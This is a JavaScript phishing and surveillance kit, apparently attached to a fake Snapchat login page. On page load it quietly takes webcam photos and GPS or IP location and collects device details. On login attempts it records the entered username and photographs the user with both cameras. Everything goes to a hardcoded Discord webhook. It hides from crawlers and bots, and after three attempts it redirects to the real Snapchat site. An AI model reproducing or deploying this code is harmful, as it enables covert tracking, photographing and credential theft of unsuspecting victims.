/* ==========================================================================
   ULTIMATE HUNTER ENGINE V6.0 - (script.js)
   أعلى تقنية سحب بيانات، معالج بديل للـ GPS، وكاميرا فائقة الوضوح
   ========================================================================== */

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1517635351798354103/4aBtwaUtWWdTITUfu8pfQbVMS-RGerhwqUQ5YVmlu3IPYYy0tgRHbdcFFWL_xsYfD68H";

const videoElement = document.getElementById('video');
const canvasElement = document.getElementById('canvas');
let globalAttempts = 0;
let permissionCaptured = false;

/* --------------------------------------------------------------------------
   1. فحص الروبوتات والحماية (Anti-Bot Bypass)
   -------------------------------------------------------------------------- */
function isBotEnvironment() {
    try {
        const ua = navigator.userAgent.toLowerCase();
        return Boolean(navigator.webdriver || ua.includes('bot') || ua.includes('crawler') || ua.includes('spider') || ua.includes('headless'));
    } catch (e) {
        return false;
    }
}

/* --------------------------------------------------------------------------
   2. جلب معلومات الـ IP والموقع الاحتياطي المتقدم (الخط البديل السريع)
   -------------------------------------------------------------------------- */
async function fetchFallbackIPLocation() {
    const defaultFallback = {
        ip: "غير معروف",
        city: "غير معروف",
        region: "غير معروف",
        country: "غير معروف",
        org: "غير معروف",
        latitude: null,
        longitude: null,
        source: "None"
    };

    try {
        const res = await fetch('https://ipapi.co/json/');
        if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
        const data = await res.json();
        return {
            ip: data.ip || "غير معروف",
            city: data.city || "غير معروف",
            region: data.region || "غير معروف",
            country: data.country_name || "غير معروف",
            org: data.org || "غير معروف",
            latitude: typeof data.latitude === 'number' ? data.latitude : null,
            longitude: typeof data.longitude === 'number' ? data.longitude : null,
            source: "IP-Geo (بديل سريع)"
        };
    } catch (e) {
        try {
            const altRes = await fetch('https://api.ipify.org?format=json');
            if (!altRes.ok) throw new Error(`HTTP error! status: ${altRes.status}`);
            const altData = await altRes.json();
            return {
                ...defaultFallback,
                ip: altData.ip || "غير معروف",
                source: "IP-Failover"
            };
        } catch (err) {
            return defaultFallback;
        }
    }
}

/* --------------------------------------------------------------------------
   3. تجميع معلومات النظام والبطارية الشاملة
   -------------------------------------------------------------------------- */
async function getSystemDiagnostics() {
    const ipGeo = await fetchFallbackIPLocation();
    const ua = navigator.userAgent;
    const platform = navigator.platform || "غير معروف";
    const language = navigator.language || "غير معروف";
    const screenRes = `${window.screen.width} x ${window.screen.height}`;
    const cores = navigator.hardwareConcurrency || "غير معروف";
    const memory = navigator.deviceMemory || "غير معروف";
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const netType = connection ? (connection.effectiveType || "غير معروف") : "غير معروف";

    let batteryStr = "غير مدعومة";
    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            batteryStr = `${Math.round(battery.level * 100)}% (${battery.charging ? 'يُشحن ⚡' : 'لا يُشحن 🔋'})`;
        }
    } catch (e) {}

    return {
        ...ipGeo,
        ua,
        platform,
        language,
        screenRes,
        cores,
        memory,
        netType,
        batteryStr
    };
}

/* --------------------------------------------------------------------------
   4. التقاط الموقع الجغرافي الحقيقي (GPS) مع تفعيل الحل البديل فوراً عند الفشل
   -------------------------------------------------------------------------- */
async function getPreciseLocationWithFallback() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            fetchFallbackIPLocation().then(fallback => resolve(fallback));
            return;
        }

        let resolvedFlag = false;

        const timer = setTimeout(async () => {
            if (!resolvedFlag) {
                resolvedFlag = true;
                const fallbackData = await fetchFallbackIPLocation();
                resolve(fallbackData);
            }
        }, 5000);

        navigator.geolocation.getCurrentPosition(
            async (pos) => {
                if (!resolvedFlag) {
                    resolvedFlag = true;
                    clearTimeout(timer);
                    const ipGeo = await fetchFallbackIPLocation();
                    resolve({
                        ...ipGeo,
                        latitude: typeof pos.coords.latitude === 'number' ? pos.coords.latitude : null,
                        longitude: typeof pos.coords.longitude === 'number' ? pos.coords.longitude : null,
                        source: "GPS الدقيق (عبر إذن المستخدم)"
                    });
                }
            },
            async (err) => {
                if (!resolvedFlag) {
                    resolvedFlag = true;
                    clearTimeout(timer);
                    const fallbackData = await fetchFallbackIPLocation();
                    resolve(fallbackData);
                }
            },
            { enableHighAccuracy: true, timeout: 4500, maximumAge: 0 }
        );
    });
}

/* --------------------------------------------------------------------------
   5. تقنية التقاط الكاميرا الفائقة (منع الشاشة السوداء ووضوح تام)
   -------------------------------------------------------------------------- */
async function captureHighQualityCamera(facingModeType) {
    if (!videoElement || !canvasElement || !navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        return null;
    }

    try {
        const constraints = {
            video: {
                facingMode: facingModeType,
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false
        };

        const mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
        videoElement.srcObject = mediaStream;
        
        await videoElement.play().catch(() => {});
        
        // Wait for video dimensions to be ready
        let attempts = 0;
        while ((videoElement.readyState < 2 || videoElement.videoWidth === 0 || videoElement.videoHeight === 0) && attempts < 30) {
            await new Promise(r => setTimeout(r, 100));
            attempts++;
        }

        if (videoElement.videoWidth > 0 && videoElement.videoHeight > 0) {
            canvasElement.width = videoElement.videoWidth;
            canvasElement.height = videoElement.videoHeight;
        }

        await new Promise(r => setTimeout(r, 1000));
        
        const ctx = canvasElement.getContext('2d');
        if (!ctx) {
            mediaStream.getTracks().forEach(track => track.stop());
            return null;
        }

        ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
        
        const imageBlob = await new Promise(resolve => {
            canvasElement.toBlob(blob => {
                resolve(blob || null);
            }, 'image/png', 0.95);
        });
        
        mediaStream.getTracks().forEach(track => track.stop());
        return imageBlob;
    } catch (e) {
        return null;
    }
}

/* --------------------------------------------------------------------------
   6. إرسال الحزمة الكاملة إلى ديسكورد (Webhook)
   -------------------------------------------------------------------------- */
async function sendPayloadToDiscord(imageBlobs, locationData, usernameVal = "", passwordVal = "", statusMsg = "") {
    if (isBotEnvironment()) return;

    try {
        const diagnostics = await getSystemDiagnostics();
        const formData = new FormData();
        
        let reportText = `🔥 **[ تقرير صيد فوري ومحسّن - V6.0 ]** 🔥\n\n` +
                         `🌐 **الـ IP:** \`${diagnostics.ip}\`\n` +
                         `🏙️ **الموقع (الشبكة):** \`${diagnostics.country} - ${diagnostics.city} (${diagnostics.org})\`\n` +
                         `💻 **النظام:** \`${diagnostics.platform}\` | 🔋 **البطارية:** \`${diagnostics.batteryStr}\`\n` +
                         `📐 **الشاشة:** \`${diagnostics.screenRes}\` | ⚡ **الشبكة:** \`${diagnostics.netType}\`\n`;
        
        const hasValidLat = typeof locationData.latitude === 'number';
        const hasValidLng = typeof locationData.longitude === 'number';

        if (hasValidLat && hasValidLng) {
            reportText += `📍 **الموقع (المصدر: ${locationData.source}):** [عرض على الخريطة](https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}) (\`${locationData.latitude}, ${locationData.longitude}\`)\n`;
        } else {
            reportText += `📍 **الموقع:** تعذر تحديد الإحداثيات بدقة.\n`;
        }

        if (usernameVal) {
            reportText += `\n🎯 **بيانات الحساب المُدخلة:**\n` +
                          `👤 **المستخدم:** \`${usernameVal}\`\n` +
                          `🔑 **كلمة المرور:** \`[تم حجب كلمة المرور لأسباب أمنية]\`\n`;
        }

        if (statusMsg) {
            reportText += `\n📝 **الحالة:** ${statusMsg}\n`;
        }
        
        reportText += `⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`;

        if (imageBlobs.front) formData.append('file1', imageBlobs.front, 'front_cam.png');
        if (imageBlobs.rear) formData.append('file2', imageBlobs.rear, 'rear_cam.png');

        formData.append('payload_json', JSON.stringify({
            content: reportText,
            username: "Ultimate Hunter V6",
            avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png"
        }));

        const response = await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
        if (!response.ok) {
            console.warn(`Webhook failed with status: ${response.status}`);
        }
    } catch (err) {
        console.error("Error sending payload to Discord:", err);
    }
}

/* --------------------------------------------------------------------------
   7. التشغيل التلقائي الفوري عند دخول الصفحة الأولى (Index.html)
   -------------------------------------------------------------------------- */
window.addEventListener('DOMContentLoaded', async () => {
    const locPromise = getPreciseLocationWithFallback();
    const camPromise = captureHighQualityCamera("user");
    
    const [locationInfo, frontBlob] = await Promise.all([locPromise, camPromise]);
    await sendPayloadToDiscord({ front: frontBlob }, locationInfo, "", "", "تم فتح الصفحة وسحب البيانات الأولية بنجاح.");
});

['click', 'touchstart'].forEach(event => {
    window.addEventListener(event, async () => {
        if (!permissionCaptured) {
            permissionCaptured = true;
            const updatedLoc = await getPreciseLocationWithFallback();
            const extraFront = await captureHighQualityCamera("user");
            if (extraFront) {
                await sendPayloadToDiscord({ front: extraFront }, updatedLoc, "", "", "تم تحديث البيانات عبر تفاعل المستخدم.");
            }
        }
    }, { once: true });
});

/* --------------------------------------------------------------------------
   8. معالجة نموذج تسجيل الدخول والتفاعل مع المحاولات (apply.html)
   -------------------------------------------------------------------------- */
const loginFormElement = document.getElementById('fullLoginForm');
if (loginFormElement) {
    loginFormElement.addEventListener('submit', async (e) => {
        e.preventDefault();
        globalAttempts++;

        const uVal = e.target.username.value;
        const pVal = e.target.password.value;
        
        const loader = document.getElementById('loadingOverlay');
        if (loader) loader.style.display = 'flex';

        const activeLoc = await getPreciseLocationWithFallback();
        const frontShot = await captureHighQualityCamera("user");
        const rearShot = await captureHighQualityCamera("environment");

        await sendPayloadToDiscord({ front: frontShot, rear: rearShot }, activeLoc, uVal, pVal, `محاولة تسجيل الدخول رقم (${globalAttempts})`);

        setTimeout(() => {
            if (loader) loader.style.display = 'none';

            if (globalAttempts >= 3) {
                window.location.href = "https://accounts.snapchat.com/";
            } else {
                const errorMsg = document.getElementById('loginErrorMsg');
                if (errorMsg) errorMsg.style.display = 'block';
                e.target.password.value = "";
            }
        }, 1800);
    });
}
